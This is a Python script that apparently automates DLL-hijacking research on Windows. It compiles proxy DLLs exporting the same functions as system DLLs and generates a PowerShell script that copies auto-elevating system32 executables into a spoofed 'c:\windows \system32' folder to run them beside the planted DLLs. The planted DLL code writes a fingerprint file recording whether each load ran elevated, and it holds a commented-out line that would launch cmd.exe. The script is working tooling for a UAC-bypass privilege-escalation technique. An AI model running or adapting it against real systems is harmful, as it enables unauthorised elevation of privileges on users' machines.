#!/usr/python3

import csv
import glob
import os
import re
import subprocess
import sys
from typing import Dict, List, Tuple

import tqdm


def get_loaded_dlls(csv_folder: str) -> Dict[str, List[str]]:
    print('Parsing CSV data...')
    results = {}
    # Generate (process -> dll) mapping
    for file_name in sorted(glob.glob(csv_folder)):
        with open(file_name) as f:
            loaded_dlls = csv.reader(f)
            for loaded_dll in loaded_dlls:
                # See if our users folder is present - if so, it's a target DLL
                if any(['\\users\\' in entry.lower() for entry in loaded_dll]):
                    dll_path = loaded_dll[4].split('\\')[-1].lower()
                    process_name = file_name[:-4].lower()
                    results[process_name] = results.get(process_name, []) + [dll_path]

    # Generate (dll -> processes) mapping
    dlls = {}
    for process_name, dll_paths in results.items():
        for dll_path in dll_paths:
            dlls[dll_path] = dlls.get(dll_path, []) + [process_name]

    return dlls


def get_dll_exports(filename: str) -> Dict[str, Tuple[str, int]]:
    # Input: Nirsoft DLL Viewer export
    print('Parsing DLL Export information...')
    dllviewer_format = r"""==================================================\nFunction Name\s+: (.*?)\nAddress\s+: (.*?)\nRelative Address\s+: .*?\nOrdinal\s+: (\d+)\s*\(.*?\nFilename\s+: (.*?)\nFull Path\s+: .*?\nType\s+: Exported Function\n=================================================="""

    # Open Nirsoft generated file
    with open(filename) as f:
        data = f.read()

    # Parse data and create mapping
    mapping = {}
    for entry_point, address, ordinal, dll in re.findall(dllviewer_format, data):
        if '.' in address:
            continue
        dll_name = dll.lower()
        mapping[dll_name] = mapping.get(dll_name, []) + [(entry_point, ordinal)]
    return mapping


def compile_dll(dll_name: str, entry_points: List[str]) -> bool:
    dll_functions = '''BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if(GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) { CloseHandle(hToken); }
    return fRet;
}

VOID generate_fingerprint(const char* f) {
    TCHAR fileName[MAX_PATH+1];
    DWORD charsWritten = GetModuleFileName(NULL, fileName, MAX_PATH + 1);
    char* buf = strrchr(fileName, \'\\\\\');

    char path[MAX_PATH+1];
    HMODULE hm = NULL;

    if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR) &generate_fingerprint, &hm) == 0){
        int ret = GetLastError();
        fprintf(stderr, "GetModuleHandle failed, error = %d\\n", ret);
    }
    if (GetModuleFileName(hm, path, sizeof(path)) == 0){
        int ret = GetLastError();
        fprintf(stderr, "GetModuleFileName failed, error = %d\\n", ret);
    }

    char* buf2 = strrchr(path, \'\\\\\');
    TCHAR result[MAX_PATH*4];
    snprintf(result, MAX_PATH*4, "c:\\\\users\\\\public\\\\downloads\\\\%s_%s_%s_%d.txt", &buf[1], &buf2[1], f, IsElevated());

    FILE *fptr;
    fptr = fopen(result, "wb");
    fwrite(result, strlen(result)+1, sizeof(TCHAR), fptr);
    fclose(fptr);
    //WinExec(\"cmd.exe\", 1);
}'''
    dll_c_header = "#include <windows.h>\n#include <lmcons.h>\n#include <stdio.h>\n"+dll_functions+"\nBOOL WINAPI DllMain(HINSTANCE hModule, DWORD fdwReason, LPVOID lpvReserved) {\n    static HANDLE hThread;\n\n    switch (fdwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n        case DLL_PROCESS_DETACH:\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n            generate_fingerprint(__func__);\n            break;\n    }\n\n    return TRUE;\n}\n\n"
    dll_def_header = "LIBRARY MyDLLName\nEXPORTS\n"
    dll_c_entry = "VOID *{}(){{ generate_fingerprint(__func__); }}\n"

    dll_path = "dll/{}".format(dll_name)
    dll_def_path = "{}.def".format(dll_path)
    dll_c_path = "{}.c".format(dll_path)

    with open(dll_def_path, 'w') as dll_def:
        with open(dll_c_path, 'w') as dll_c:
            # Write header to C code and DEF file
            dll_c.write(dll_c_header)
            dll_def.write(dll_def_header)

            for entry_point, ordinal in list(set(entry_points)):
                # If C++ or built-in function, ignore
                if ':' in entry_point or ' ' in entry_point or entry_point.startswith('Dll'):
                    continue
                # Add entry point to C code and DEF file
                dll_c.write(dll_c_entry.format(entry_point))
                dll_def.write("{}\t@{}\n".format(entry_point, ordinal))

    # Compile DLL using docker call
    if subprocess.call(["docker", "run", "--rm", "-ti", "-v", "{}:/mnt".format(os.getcwd()), "mmozeiko/mingw-w64", "x86_64-w64-mingw32-gcc", "-shared", "-mwindows", "-o", dll_path, dll_c_path, dll_def_path], stdout=subprocess.DEVNULL):
        print('Could not compile {}'.format(dll_name), file=sys.stderr)
        return False
    return True


def generate_ps1_file(dll_process_mapping: Dict[str, List[str]], ps1_file: str) -> None:
    print('Generating {}...'.format(ps1_file))

    ps1_dictionary = "$items = @{" + (';'.join(['{}=("{}")'.format(dll.replace('.', '___'), '","'.join(executables)) for dll, executables in dll_process_mapping.items()])) + '}'
    ps1_function = '''# Define our dir
$ExeDir = "\\\\?\\c:\\windows \\system32"
# Create our dir
mkdir $ExeDir
# Copy all legitimate DLLs to our folder
Copy-Item -Force "c:\\windows\\system32\\*.dll" $ExeDir;
# Skip the following executables, as they require UAC without auto elevation
$skips = "*hdwwiz*","*recoverydrive*","*mmc*","*infdefaultinstall*","*regedt32*","*verifier*","*tabcal*","*diskraid*","*uev*generator*","*slui*"
# Iterate over DLL/Process pairs
foreach ($item in $items.GetEnumerator()) {
    $StopLoop = $false;
    # Copy custom DLL to our folder
    Copy-Item -Force ("{0}"-f($item.Key-replace"___",".")) $ExeDir
    # For each associated process:
    foreach ($process in $item.Value){
        # If in skip list, skip execution
        if($skips | where {$process -Like $_}){ continue; }
        # Copy legitimate executable to our folder
        Copy-Item -Force ("c:\\windows\\system32\\{0}"-f$process) $ExeDir;
        # Run legitimate executable in our folder (PowerShell won't let you do this, hence the VBScript)
        cscript runme.vbs ("{0}"-f$process);
    }
    # Sleep to let processes do their DLL loads
    Start-Sleep 3;
    # Try close any processes still running in our folder
    (Get-WmiObject win32_process -filter "CommandLine LIKE '%windows %'").Terminate() | Out-Null;
    # Try delete any executables in our folder
    Remove-Item -Force ("{0}\\*.exe"-f$ExeDir) | Out-Null
    # Restore original DLL (might require user interaction if executable was auto elevated)
    do {
        try {
            Copy-Item -Force ("c:\\windows\\system32\\{0}"-f($item.Key-replace"___",".")) $ExeDir;
            $StopLoop = $true
        } catch {
            "Unable to restore DLL, retrying...";
            Start-Sleep -Seconds 3;
        }
    } while ($StopLoop -eq $false)
}

# Try delete everything in our special dir
Remove-Item -Recursive -Force $ExeDir'''
    with open(ps1_file, 'w') as f:
        f.write('\n'.join([ps1_dictionary, ps1_function]))


if __name__ == "__main__":
    # Get all DLLs and the processes they are loaded by
    loaded_dlls = get_loaded_dlls('*.csv')
    dll_process_mapping = {dll: list(set([executable.split('/')[-1] for executable in executables])) for dll, executables in loaded_dlls.items()}
    successful_dlls = {}

    # Get all DLLs with their entry points
    dll_to_entrypoint = get_dll_exports('entrypoints.txt')

    # Iterate over all DLLs that have entry point information
    print("Compiling DLLs...")
    for dll_name, entry_points in tqdm.tqdm(dll_to_entrypoint.items()):
        # Compile DLL
        if compile_dll(dll_name, entry_points):
            # If successful, add to list
            successful_dlls[dll_name] = dll_process_mapping[dll_name]

    # Generate PowerShell file for successful DLLs
    generate_ps1_file(successful_dlls, 'dll_hijack_test.ps1')
